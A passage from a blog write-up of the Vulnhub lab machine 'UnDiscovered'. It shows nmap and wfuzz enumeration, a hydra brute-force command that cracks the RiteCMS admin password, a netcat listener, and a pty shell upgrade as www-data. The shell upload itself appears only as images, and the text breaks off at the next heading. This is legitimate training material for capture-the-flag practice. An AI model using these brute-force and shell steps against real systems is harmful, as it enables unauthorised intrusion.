---
title: Vulnhub - UnDiscovered
description: My writeup on UnDiscovered box.
categories:
 - vulnhub
tags: vulnhub nfs
---

![](https://i.imgur.com/mmvSbqs.png)

You can find the machine there > [UnDiscovered](https://www.vulnhub.com/entry/undiscovered-101,550/){:target="_blank"}

## Summary

This was one of the best vulnhub box, thanks to [@aniqfakhrul](https://twitter.com/aniqfakhrul){:target="_blank"} & [@h0j3n](https://twitter.com/h0j3n){:target="_blank"} for this awesome box! Let’s pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.5                                     
$ nmap -p- -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-30 21:10 EEST
Nmap scan report for undiscovered.zte.com.cn (192.168.1.5)
Host is up (0.00036s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
80/tcp    open  http     Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://undiscovered.thm
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      34047/tcp6  nlockmgr
|   100021  1,3,4      44886/tcp   nlockmgr
|   100021  1,3,4      51937/udp   nlockmgr
|   100021  1,3,4      55740/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      2-4 (RPC #100003)
44886/tcp open  nlockmgr 1-4 (RPC #100021)
```

Lot of interesting stuff, let's enumerate port 80 first. When we visit port 80 doens't load, nmap scan says something important `Did not follow redirect to http://undiscovered.thm` probably a virtual host we have to add it to `/etc/hosts`:

```
$ echo "192.168.1.5 undiscovered.thm" | tee -a /etc/hosts
192.168.1.5 undiscovered.thm
$ cat /etc/hosts
..data..
192.168.1.5 undiscovered.thm
```

Now it works, i tried lot of stuff like `gobuster`,`dirb` but nothing at all. Since we have a virtual host we can enumerate for subdomains. Let's fire up `wfuzz`:

```
$ wfuzz -w /root/Documents/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt -H "Host: FUZZ.undiscovered.thm" --hw 26 undiscovered.thm

000000096:   200        68 L     341 W    4626 Ch     "dashboard"                                                                                                             
000000102:   200        83 L     341 W    4599 Ch     "booking"                                                                                                               
000000129:   200        68 L     341 W    4521 Ch     "play"                                                                                                                  
000000156:   200        68 L     341 W    4626 Ch     "resources"                                                                                                             
000000218:   200        68 L     341 W    4542 Ch     "forms"                                                                                                                 
000000257:   200        68 L     341 W    4542 Ch     "start"                                                                                                                 
000000553:   200        68 L     341 W    4584 Ch     "manager"                                                                                                               
000000681:   200        68 L     341 W    4584 Ch     "network"                                                                                                               
000000733:   200        68 L     341 W    4605 Ch     "internet"                                                                                                              
000000889:   200        68 L     341 W    4521 Ch     "view"                                                                                                                  
000001245:   200        68 L     341 W    4521 Ch     "gold"                                                                                                                  
000001305:   200        68 L     341 W    4668 Ch     "maintenance"                                                                                                           
000005963:   200        68 L     341 W    4605 Ch     "terminal"                                                                                                              
000006033:   200        68 L     341 W    4584 Ch     "newsite"                                                                                                               
000007423:   200        68 L     341 W    4584 Ch     "develop"                                                                                                               
000022957:   200        68 L     341 W    4605 Ch     "mailgate"                                                                                                              
000034373:   200        82 L     341 W    4650 Ch     "deliver" 
```

Lot subdomains, all of them run `RiteCMS` but most of them seem broken admin panel missing. One of them works thats `deliver.undiscovered.thm` let's add it to `/etc/hosts`:

```
$ echo "192.168.1.5 deliver.undiscovered.thm" | tee -a /etc/hosts
192.168.1.5 deliver.undiscovered.thm
$ cat /etc/hosts 
..data..
192.168.1.5 undiscovered.thm
192.168.1.5 deliver.undiscovered.thm
```

## Shell as www-data

Now we can see the admin panel under `/cms`:

![](https://i.imgur.com/FINKQFM.png)

Let's search for possible exploits on RiteCMS:

```
$ searchsploit -w ritecms
-----------------------------------------------------------------------------------------------------------------
 Exploit Title                                                       |  URL
-----------------------------------------------------------------------------------------------------------------
RiteCMS 1.0.0 - Multiple Vulnerabilities                             | https://www.exploit-db.com/exploits/27315
RiteCMS 2.2.1 - Authenticated Remote Code Execution                  | https://www.exploit-db.com/exploits/48636
-----------------------------------------------------------------------------------------------------------------
```

Second one seems perfect, but we need creds. Tried default username/password `admin:admin` but didn't work. Let's fire up hydra!

```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=admin&userpw=^PASS^:User unknown or password wrong"

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=admin&userpw=^PASS^:User unknown or password wrong
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
```

& we're in as `admin:liverpool` follow my steps for shell upload:

![](https://i.imgur.com/OJnp4pH.png)

![](https://i.imgur.com/w5qgPOD.png)

![](https://i.imgur.com/xlopYfo.png)

![](https://i.imgur.com/leifpNg.png)

```
$ nc -lvp 5555
listening on [any] 5555 ...

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@undiscovered:/$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as william


